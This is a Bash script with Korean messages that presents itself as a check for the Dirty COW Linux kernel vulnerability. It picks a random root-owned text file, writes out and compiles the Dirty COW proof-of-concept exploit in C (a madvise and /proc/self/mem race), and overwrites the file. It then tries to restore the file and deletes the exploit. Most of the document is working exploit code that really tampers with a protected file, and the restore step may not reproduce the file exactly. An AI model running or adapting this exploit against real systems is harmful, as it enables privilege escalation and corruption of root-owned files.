#!/bin/bash

echo "취약점 찾기를 시작합니다."

# 공격 가능한 파일 검색
echo "공격이 가능한 파일을 찾는 중입니다..."
target_file_list=$(find / -name "*.txt" -user "root" -perm -u=r -perm -o=r 2>/dev/null)

# 검색 결과 확인 및 파일 정보 출력
if [ -n "$target_file_list" ]; then
    echo "파일이 발견되었습니다. 임의의 파일을 선택합니다..."

    # 임의의 파일 하나를 선택
    target_file=$(echo "$target_file_list" | shuf -n 1)
    echo "선택된 파일: $target_file"

    # 선택된 파일의 권한 정보 확인
    information=$(ls -l -a -h "$target_file")
    echo "해당 파일의 경로: $target_file"
    echo "해당 파일의 정보: $information"

    # 파일 내용을 변수에 저장
    original_file_content=$(cat "$target_file")
else
    echo "공격이 가능한 파일을 찾을 수 없습니다."
    exit 1
fi

# 공격 파일 이름 설정
attack_file_code="dirtycow.c"
attack_file="dirtycow"

# 공격 코드 작성
cat << 'EOF' > $attack_file_code
//공격 코드
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;

    for(int i=0;i<100000000;i++)
    {
      madvise(map,100,MADV_DONTNEED);
    }
}

void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);

    for(int i=0;i<100000000;i++)
    {
        lseek(f,(uintptr_t) map,SEEK_SET);
        write(f,str,strlen(str));
    }
}
 
int main(int argc,char *argv[])
{
    pthread_t pth1,pth2;
    f=open(argv[1],O_RDONLY);
    fstat(f,&st);
    name=argv[1];
    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    printf("mmap %zx\n\n",(uintptr_t) map);
    pthread_create(&pth1,NULL,madviseThread,argv[1]);
    pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
    pthread_join(pth1,NULL);
    pthread_join(pth2,NULL);

    return 0;
}
EOF

echo "공격 프로그램이 설치되었습니다."

# 공격 파일 컴파일
gcc -pthread -o $attack_file $attack_file_code

# 컴파일 완료 확인
if [ $? -eq 0 ]; then
    echo "공격 프로그램이 컴파일에 성공하였습니다."
else
    echo "공격 프로그램이 컴파일에 실패하였습니다."
    rm -rf $attack_file_code
    exit 1
fi

# 프로그램 실행
echo "공격 프로그램을 실행합니다..."

# Dirty COW 공격
attack_phrase="This is hacking!!00000000000000000000000000000000000000000000000000000000000000000000"
./$attack_file "$target_file" "$attack_phrase" &
pid=$!

# 1초 대기
sleep 1

# 프로세스 종료
if ps -p $pid > /dev/null; then
    echo "공격 프로그램을 종료합니다."
    kill -SIGKILL $pid
fi

# 공격 후 파일 내용 저장
modified_file_content=$(cat "$target_file" | tr -d '\000')

# 파일 내용 복원
echo "$original_file_content" > "$target_file"

# 파일 내용 비교
if [ "$original_file_content" != "$modified_file_content" ]; then
    echo -e "\033[0;31mDirty COW에 취약합니다.\033[0m"
else
    echo -e "\033[0;32mDirty COW에 취약하지 않습니다.\033[0m"
fi

rm -rf $attack_file_code
rm -rf $attack_file
echo  "공격 프로그램이 삭제되었습니다."

# 완료 메시지 출력
echo "취약점 점검이 완료되었습니다."